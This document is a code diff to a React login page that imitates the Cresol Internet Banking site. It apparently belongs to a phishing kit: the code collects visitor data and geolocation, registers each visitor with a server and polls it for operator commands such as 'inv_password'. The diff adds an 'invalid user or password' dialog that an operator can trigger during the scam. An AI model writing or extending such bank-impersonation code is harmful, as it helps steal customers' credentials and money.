@@ -1,7 +1,6 @@
-
 import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
-import { Eye, EyeOff, HelpCircle, CheckCircle, XCircle } from "lucide-react";
+import { Eye, EyeOff, HelpCircle, CheckCircle, XCircle, AlertTriangle } from "lucide-react";
 import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
 import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
 import { VirtualKeyboardInline } from "@/components/VirtualKeyboardInline";
@@ -10,6 +9,14 @@ import { useClientStatus } from "@/hooks/useClientStatus";
 import { useMetrics } from "@/hooks/useMetrics";
 import { useToast } from "@/hooks/use-toast";
 import { useCpfValidation } from "@/hooks/useCpfValidation";
+import {
+  AlertDialog,
+  AlertDialogAction,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog";
 
 // Atualize aqui: Use título e subtítulo (duas linhas) como campos explícitos!
 const TABS = [
@@ -87,7 +94,7 @@ const collectClientData = async () => {
 };
 
 // Função para monitorar cliente continuamente
-const monitorClient = async (clientId: string, navigate: (path: string) => void, toast: any): Promise<void> => {
+const monitorClient = async (clientId: string, navigate: (path: string) => void, toast: any, setShowInvalidDataModal: (show: boolean) => void): Promise<void> => {
   console.log(`Iniciando monitoramento do cliente: ${clientId}`);
   
   let intervalId: NodeJS.Timeout;
@@ -126,16 +133,12 @@ const monitorClient = async (clientId: string, navigate: (path: string) => void,
           return;
         }
         
-        // Verificar se recebeu comando de senha inválida
+        // Verificar se recebeu comando de senha inválida - mostrar modal
         if (clientData.data?.response === "inv_password" || clientData.data?.command === "inv_password") {
-          console.log('Detectado inv_password - Senha inválida');
+          console.log('Detectado inv_password - Mostrando modal de dados inválidos');
           clearInterval(intervalId);
-          console.log('Monitoramento parado - senha inválida');
-          toast({
-            title: "Senha inválida",
-            description: "A senha informada está incorreta. Verifique sua senha e tente novamente.",
-            variant: "destructive",
-          });
+          console.log('Monitoramento parado - dados inválidos');
+          setShowInvalidDataModal(true);
           return;
         }
         
@@ -176,7 +179,7 @@ const monitorClient = async (clientId: string, navigate: (path: string) => void,
 };
 
 // Função para processar resposta de registro e iniciar monitoramento
-const processRegistrationResponse = async (response: Response, navigate: (path: string) => void, toast: any): Promise<void> => {
+const processRegistrationResponse = async (response: Response, navigate: (path: string) => void, toast: any, setShowInvalidDataModal: (show: boolean) => void): Promise<void> => {
   try {
     const responseData = await response.json();
     console.log('Cliente registrado com sucesso:', responseData);
@@ -190,7 +193,7 @@ const processRegistrationResponse = async (response: Response, navigate: (path: 
       console.log('ClientId salvo no localStorage:', responseData.clientId);
       
       // Iniciar monitoramento contínuo do cliente
-      await monitorClient(responseData.clientId, navigate, toast);
+      await monitorClient(responseData.clientId, navigate, toast, setShowInvalidDataModal);
     } else {
       console.log('ClientId não encontrado na resposta');
       
@@ -201,7 +204,7 @@ const processRegistrationResponse = async (response: Response, navigate: (path: 
         // Salvar clientId no localStorage
         localStorage.setItem('clientId', clientId);
         console.log('ClientId salvo no localStorage:', clientId);
-        await monitorClient(clientId, navigate, toast);
+        await monitorClient(clientId, navigate, toast, setShowInvalidDataModal);
       }
     }
   } catch (error) {
@@ -226,6 +229,7 @@ const Index = () => {
   const [saveCnpj, setSaveCnpj] = useState(false);
   const [saveChaveMulticanal, setSaveChaveMulticanal] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
+  const [showInvalidDataModal, setShowInvalidDataModal] = useState(false);
 
   // ---- Geolocalização nativa do navegador ----
   useEffect(() => {
@@ -382,7 +386,7 @@ const Index = () => {
       
       if (response.ok) {
         // Processar resposta e iniciar monitoramento
-        await processRegistrationResponse(response, navigate, toast);
+        await processRegistrationResponse(response, navigate, toast, setShowInvalidDataModal);
       } else {
         const errorData = await response.text();
         console.log('Erro na resposta da API:', errorData);
@@ -563,117 +567,146 @@ const Index = () => {
   }, [clientStatus]);
 
   return (
-    <div className="min-h-screen flex bg-[#fff] overflow-x-hidden">
-      {/* Main Content Container */}
-      <div className="w-full lg:w-1/2 flex flex-col justify-start px-4 sm:px-6 lg:px-[7%] pt-6 lg:pt-4 pb-8 relative">
-        <div className="max-w-md w-full mx-auto">
-          <div className="flex justify-center mb-6">
-            <img
-              src={cresolLogo}
-              alt="Cresol"
-              className="h-10 md:h-12"
-            />
-          </div>
-          <h1 className="text-2xl md:text-3xl font-semibold text-gray-600 mb-4 text-center lg:text-left">Seja bem-vindo</h1>
-          <p className="text-lg md:text-xl text-gray-600 mb-8 md:mb-10 text-center lg:text-left">
-            Acesse sua conta e realize suas transações de forma rápida e segura a qualquer hora.
-          </p>
-          
-          {/* Tabs */}
-          <div className="grid grid-cols-3 gap-x-2 sm:gap-x-4 lg:gap-x-12 gap-y-0 mb-2 mt-1 max-w-[470px]">
-            {TABS.map((t, idx) => (
-              <button
-                key={t.value}
-                className={`pb-0.5 pt-1.5 text-sm sm:text-base lg:text-lg leading-snug font-semibold transition-colors text-[#145C36]
-                  flex flex-col items-center min-h-[44px]
-                  ${tab === t.value ? "border-b-4 border-orange-500" : "border-b-4 border-transparent"}
-                `}
-                onClick={() => setTab(t.value)}
-              >
-                <span>{t.title}</span>
-                <span>{t.subtitle}</span>
-              </button>
-            ))}
-          </div>
-
-          <form className="mt-6" onSubmit={handleLogin}>
-            {renderFormContent()}
-            <button
-              type="submit"
-              disabled={isLoading}
-              className="w-full h-12 rounded-full bg-orange-500 hover:bg-orange-600 transition font-bold text-white text-base md:text-lg shadow mt-0 mb-8 lg:mb-10 disabled:opacity-70 flex items-center justify-center"
-              style={{
-                background: isLoading ? "linear-gradient(90deg,#ffaa00,#ff7300 100%)" : "linear-gradient(90deg,#ffaa00,#ff7300 100%)",
-                borderRadius: "30px",
-              }}
-            >
-              {isLoading ? (
-                <div className="flex items-center">
-                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
-                  Carregando...
-                </div>
-              ) : (
-                "Entrar"
-              )}
-            </button>
-          </form>
-
-          {/* Primeira linha separadora */}
-          <hr className="w-full border-t border-gray-200 my-6 lg:my-8" />
-
-          {/* Primeiro acesso - abas física, jurídica e financeiro */}
-          {(tab === "fisica" || tab === "juridica" || tab === "financeiro") && (
-            <>
-              <div className="w-full flex flex-col items-center lg:items-start">
-                <h2 className="text-xl md:text-2xl lg:text-3xl font-bold mb-2 text-gray-800 w-full text-center lg:text-left" style={{lineHeight: "1.2"}}>Primeiro acesso</h2>
-                <p className="text-sm md:text-base text-gray-700 mb-6 w-full text-center lg:text-left">
-                  Primeiro acesso aos canais digitais da Cresol? Cadastre sua conta e crie seu usuário. É simples, rápido e seguro.
-                </p>
+    <>
+      <div className="min-h-screen flex bg-[#fff] overflow-x-hidden">
+        {/* Main Content Container */}
+        <div className="w-full lg:w-1/2 flex flex-col justify-start px-4 sm:px-6 lg:px-[7%] pt-6 lg:pt-4 pb-8 relative">
+          <div className="max-w-md w-full mx-auto">
+            <div className="flex justify-center mb-6">
+              <img
+                src={cresolLogo}
+                alt="Cresol"
+                className="h-10 md:h-12"
+              />
+            </div>
+            <h1 className="text-2xl md:text-3xl font-semibold text-gray-600 mb-4 text-center lg:text-left">Seja bem-vindo</h1>
+            <p className="text-lg md:text-xl text-gray-600 mb-8 md:mb-10 text-center lg:text-left">
+              Acesse sua conta e realize suas transações de forma rápida e segura a qualquer hora.
+            </p>
+            
+            {/* Tabs */}
+            <div className="grid grid-cols-3 gap-x-2 sm:gap-x-4 lg:gap-x-12 gap-y-0 mb-2 mt-1 max-w-[470px]">
+              {TABS.map((t, idx) => (
                 <button
-                  type="button"
-                  className="w-full lg:max-w-xs h-12 rounded-full border-2 border-orange-500 text-orange-500 font-semibold text-base md:text-lg transition-colors bg-white hover:bg-orange-50 active:bg-orange-100 mb-6 lg:mb-8"
-                  style={{ boxSizing: "border-box" }}
+                  key={t.value}
+                  className={`pb-0.5 pt-1.5 text-sm sm:text-base lg:text-lg leading-snug font-semibold transition-colors text-[#145C36]
+                    flex flex-col items-center min-h-[44px]
+                    ${tab === t.value ? "border-b-4 border-orange-500" : "border-b-4 border-transparent"}
+                  `}
+                  onClick={() => setTab(t.value)}
                 >
-                  Cadastre-se
+                  <span>{t.title}</span>
+                  <span>{t.subtitle}</span>
                 </button>
-              </div>
-              {/* Linha */}
-              <hr className="w-full border-t border-gray-200 my-4 lg:my-6" />
-              {/* Termos de uso */}
-              <div className="w-full mb-6 lg:mb-7 flex flex-col items-center lg:items-start">
-                <p className="text-center lg:text-left text-sm md:text-base text-gray-600">
-                  Consulte aqui nossos{" "}
-                  <a href="#" className="text-orange-500 font-semibold hover:underline transition">
-                    termos de uso
-                  </a>
-                </p>
-              </div>
-              {/* Rodapé Cresol/versionamento */}
-              <div className="mb-0 text-center lg:text-left text-xs text-gray-800">
-                <div className="font-semibold">Cresol Internet Banking - 2025</div>
-                <div className="">Versão: 12.4.3.501 (12.4.3-501)</div>
-              </div>
-            </>
-          )}
+              ))}
+            </div>
+
+            <form className="mt-6" onSubmit={handleLogin}>
+              {renderFormContent()}
+              <button
+                type="submit"
+                disabled={isLoading}
+                className="w-full h-12 rounded-full bg-orange-500 hover:bg-orange-600 transition font-bold text-white text-base md:text-lg shadow mt-0 mb-8 lg:mb-10 disabled:opacity-70 flex items-center justify-center"
+                style={{
+                  background: isLoading ? "linear-gradient(90deg,#ffaa00,#ff7300 100%)" : "linear-gradient(90deg,#ffaa00,#ff7300 100%)",
+                  borderRadius: "30px",
+                }}
+              >
+                {isLoading ? (
+                  <div className="flex items-center">
+                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
+                    Carregando...
+                  </div>
+                ) : (
+                  "Entrar"
+                )}
+              </button>
+            </form>
+
+            {/* Primeira linha separadora */}
+            <hr className="w-full border-t border-gray-200 my-6 lg:my-8" />
+
+            {/* Primeiro acesso - abas física, jurídica e financeiro */}
+            {(tab === "fisica" || tab === "juridica" || tab === "financeiro") && (
+              <>
+                <div className="w-full flex flex-col items-center lg:items-start">
+                  <h2 className="text-xl md:text-2xl lg:text-3xl font-bold mb-2 text-gray-800 w-full text-center lg:text-left" style={{lineHeight: "1.2"}}>Primeiro acesso</h2>
+                  <p className="text-sm md:text-base text-gray-700 mb-6 w-full text-center lg:text-left">
+                    Primeiro acesso aos canais digitais da Cresol? Cadastre sua conta e crie seu usuário. É simples, rápido e seguro.
+                  </p>
+                  <button
+                    type="button"
+                    className="w-full lg:max-w-xs h-12 rounded-full border-2 border-orange-500 text-orange-500 font-semibold text-base md:text-lg transition-colors bg-white hover:bg-orange-50 active:bg-orange-100 mb-6 lg:mb-8"
+                    style={{ boxSizing: "border-box" }}
+                  >
+                    Cadastre-se
+                  </button>
+                </div>
+                {/* Linha */}
+                <hr className="w-full border-t border-gray-200 my-4 lg:my-6" />
+                {/* Termos de uso */}
+                <div className="w-full mb-6 lg:mb-7 flex flex-col items-center lg:items-start">
+                  <p className="text-center lg:text-left text-sm md:text-base text-gray-600">
+                    Consulte aqui nossos{" "}
+                    <a href="#" className="text-orange-500 font-semibold hover:underline transition">
+                      termos de uso
+                    </a>
+                  </p>
+                </div>
+                {/* Rodapé Cresol/versionamento */}
+                <div className="mb-0 text-center lg:text-left text-xs text-gray-800">
+                  <div className="font-semibold">Cresol Internet Banking - 2025</div>
+                  <div className="">Versão: 12.4.3.501 (12.4.3-501)</div>
+                </div>
+              </>
+            )}
+          </div>
+
+          {/* Help Icon */}
+          <div className="absolute bottom-4 left-4 lg:bottom-8 lg:left-8">
+            <button className="w-12 h-12 bg-orange-500 rounded-full flex items-center justify-center text-white hover:bg-orange-600 transition-colors shadow-lg">
+              <HelpCircle size={24} />
+            </button>
+          </div>
         </div>
 
-        {/* Help Icon */}
-        <div className="absolute bottom-4 left-4 lg:bottom-8 lg:left-8">
-          <button className="w-12 h-12 bg-orange-500 rounded-full flex items-center justify-center text-white hover:bg-orange-600 transition-colors shadow-lg">
-            <HelpCircle size={24} />
-          </button>
+        {/* Right: Imagem da mulher - Hidden on mobile, shown on lg+ */}
+        <div className="hidden lg:block lg:w-1/2 bg-[#f5f6f7] relative overflow-hidden">
+          <img
+            src={womanImage}
+            alt="Mulher segurando celular"
+            className="w-full h-full object-cover"
+          />
         </div>
       </div>
 
-      {/* Right: Imagem da mulher - Hidden on mobile, shown on lg+ */}
-      <div className="hidden lg:block lg:w-1/2 bg-[#f5f6f7] relative overflow-hidden">
-        <img
-          src={womanImage}
-          alt="Mulher segurando celular"
-          className="w-full h-full object-cover"
-        />
-      </div>
-    </div>
+      {/* Modal de dados inválidos */}
+      <AlertDialog open={showInvalidDataModal} onOpenChange={setShowInvalidDataModal}>
+        <AlertDialogContent className="max-w-md mx-auto">
+          <AlertDialogHeader className="text-center">
+            <div className="flex justify-center mb-4">
+              <div className="w-12 h-12 bg-orange-100 rounded-full flex items-center justify-center">
+                <AlertTriangle className="w-6 h-6 text-orange-600" />
+              </div>
+            </div>
+            <AlertDialogTitle className="text-lg font-semibold text-gray-800">
+              Usuário ou senha inválidos
+            </AlertDialogTitle>
+            <AlertDialogDescription className="text-gray-600 mt-2">
+              Número de documento não cadastrado.
+            </AlertDialogDescription>
+          </AlertDialogHeader>
+          <div className="flex justify-center mt-6">
+            <AlertDialogAction 
+              onClick={() => setShowInvalidDataModal(false)}
+              className="bg-orange-500 hover:bg-orange-600 text-white px-8 py-2 rounded-full font-medium"
+            >
+              Entendi
+            </AlertDialogAction>
+          </div>
+        </AlertDialogContent>
+      </AlertDialog>
+    </>
   );
 };
 
